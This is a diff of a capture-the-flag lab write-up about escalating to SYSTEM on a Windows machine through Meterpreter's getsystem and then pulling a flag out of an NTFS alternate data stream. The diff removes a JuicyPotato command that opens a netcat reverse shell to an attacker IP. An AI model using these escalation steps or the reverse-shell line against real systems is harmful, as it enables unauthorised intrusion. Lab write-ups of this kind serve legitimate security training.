@@ -156,8 +156,57 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 
 If we check the privileges the user we have compromised has, we see that `SeImpersonatePrivilege` is enabled.
 
+>[!warning] Could not run Rottenpotato
+>Had trouble running the attack, the token would not show up under impersonation tokens. Try again another time. Instead used the `getsystem` command via metasploit to gain the root flag
+
 ```bash
-JuicyPotato.exe -l 1337 -p nc64.exe -a "10.10.14.19 6667 -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+meterpreter > getsystem 
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > cd Desktop\\
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  797   fil   2017-11-09 01:05:18 +1100  Windows 10 Update Assistant.lnk
+100666/rw-rw-rw-  282   fil   2017-11-04 13:03:17 +1100  desktop.ini
+100444/r--r--r--  36    fil   2017-12-24 18:51:10 +1100  hm.txt
+
+meterpreter > cat hm.txt 
+The flag is elsewhere.  Look deeper.
 ```
 
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/k whoami" -t * -c {CLSID}
+## Alternate Data Streams
+
+```PowerShell
+meterpreter > shell
+Process 2964 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Desktop>dir /R
+dir /R
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,507,366,400 bytes free
+
+C:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
+more < hm.txt:root.txt:$DATA
+afbc5bd4b615a60648cec41c6ac92530
+```
+
+Read more about alternate data streams [here](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)
